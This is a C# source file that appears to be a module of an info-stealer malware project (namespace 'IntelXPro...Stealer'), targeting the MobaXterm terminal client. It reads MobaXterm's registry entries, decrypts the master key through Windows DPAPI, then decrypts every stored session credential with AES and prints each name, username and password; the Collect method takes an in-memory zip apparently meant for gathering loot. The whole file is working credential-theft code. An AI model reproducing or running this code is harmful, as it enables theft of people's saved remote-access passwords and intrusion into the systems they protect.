using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class MobaXTerm : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string entropy = (string)Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm").GetValue("SessionP");
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\m");
            string name = registryKey.GetValueNames()[0];
            string base64Value = (string)registryKey.GetValue(name);
            byte[] key = DecryptMobaXtermMasterKey(base64Value, entropy);
            RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\C");
            string[] valueNames = registryKey2.GetValueNames();
            foreach (string text in valueNames)
            {
                string[] array = ((string)registryKey2.GetValue(text)).Split(new char[1] { ':' }, 2);
                string text2 = array[0];
                string ciphertextBase = array[1];
                string text3 = DecryptCredential(key, ciphertextBase);
                Console.WriteLine("[*] Name:     " + text);
                Console.WriteLine("[*] Username: " + text2);
                Console.WriteLine("[*] Password: " + text3);
                Console.WriteLine();
            }
        }

        private byte[] DecryptMobaXtermMasterKey(string base64Value, string Entropy)
        {
            byte[] array = new byte[20]
            {
            1, 0, 0, 0, 208, 140, 157, 223, 1, 21,
            209, 17, 140, 122, 0, 192, 79, 194, 151, 235
            };
            byte[] array2 = Convert.FromBase64String(base64Value);
            byte[] array3 = new byte[array.Length + array2.Length];
            Buffer.BlockCopy(array, 0, array3, 0, array.Length);
            Buffer.BlockCopy(array2, 0, array3, array.Length, array2.Length);
            byte[] bytes = Encoding.UTF8.GetBytes(Entropy);
            return DpApi.Decrypt(array3);
        }

        private string DecryptCredential(byte[] key, string ciphertextBase64)
        {
            byte[] array = LenientBase64Decode(ciphertextBase64);
            byte[] inputBuffer = new byte[16];
            byte[] array2 = new byte[16];
            using (Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;
                aes.Key = key;
                using (ICryptoTransform cryptoTransform = aes.CreateEncryptor())
                {
                    cryptoTransform.TransformBlock(inputBuffer, 0, 16, array2, 0);
                }
            }
            byte[] array3 = (byte[])array2.Clone();
            byte[] array4 = new byte[array.Length];
            using (Aes aes2 = Aes.Create())
            {
                aes2.Mode = CipherMode.ECB;
                aes2.Padding = PaddingMode.None;
                aes2.Key = key;
                using (ICryptoTransform cryptoTransform2 = aes2.CreateEncryptor())
                {
                    byte[] array5 = new byte[16];
                    for (int i = 0; i < array.Length; i++)
                    {
                        cryptoTransform2.TransformBlock(array3, 0, 16, array5, 0);
                        array4[i] = (byte)(array[i] ^ array5[0]);
                        Buffer.BlockCopy(array3, 1, array3, 0, 15);
                        array3[15] = array[i];
                    }
                }
            }
            return Encoding.Default.GetString(array4).TrimEnd(default(char));
        }

        private byte[] LenientBase64Decode(string s)
        {
            StringBuilder stringBuilder = new StringBuilder(s.Length);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '-':
                    case '_':
                        stringBuilder.Append((c == '-') ? '+' : '/');
                        continue;
                    default:
                        if ((c < '0' || c > '9') && c != '+' && c != '/' && c != '=')
                        {
                            continue;
                        }
                        break;
                    case 'A':
                    case 'B':
                    case 'C':
                    case 'D':
                    case 'E':
                    case 'F':
                    case 'G':
                    case 'H':
                    case 'I':
                    case 'J':
                    case 'K':
                    case 'L':
                    case 'M':
                    case 'N':
                    case 'O':
                    case 'P':
                    case 'Q':
                    case 'R':
                    case 'S':
                    case 'T':
                    case 'U':
                    case 'V':
                    case 'W':
                    case 'X':
                    case 'Y':
                    case 'Z':
                    case 'a':
                    case 'b':
                    case 'c':
                    case 'd':
                    case 'e':
                    case 'f':
                    case 'g':
                    case 'h':
                    case 'i':
                    case 'j':
                    case 'k':
                    case 'l':
                    case 'm':
                    case 'n':
                    case 'o':
                    case 'p':
                    case 'q':
                    case 'r':
                    case 's':
                    case 't':
                    case 'u':
                    case 'v':
                    case 'w':
                    case 'x':
                    case 'y':
                    case 'z':
                        break;
                }
                stringBuilder.Append(c);
            }
            string text = stringBuilder.ToString();
            int num = text.Length % 4;
            if (num != 0)
            {
                text += new string('=', 4 - num);
            }
            List<byte> list = new List<byte>(text.Length * 3 / 4);
            for (int j = 0; j < text.Length; j += 4)
            {
                int[] array = new int[4];
                for (int k = 0; k < 4; k++)
                {
                    char c2 = text[j + k];
                    if (c2 == '=')
                    {
                        array[k] = -1;
                    }
                    else
                    {
                        array[k] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".IndexOf(c2);
                    }
                }
                int num2 = array[0];
                int num3 = array[1];
                int num4 = array[2];
                int num5 = array[3];
                byte item = (byte)((num2 << 2) | ((num3 & 0x30) >> 4));
                list.Add(item);
                if (num4 != -1)
                {
                    byte item2 = (byte)(((num3 & 0xF) << 4) | ((num4 & 0x3C) >> 2));
                    list.Add(item2);
                }
                if (num5 != -1)
                {
                    byte item3 = (byte)(((num4 & 3) << 6) | num5);
                    list.Add(item3);
                }
            }
            return list.ToArray();
        }
    }
}
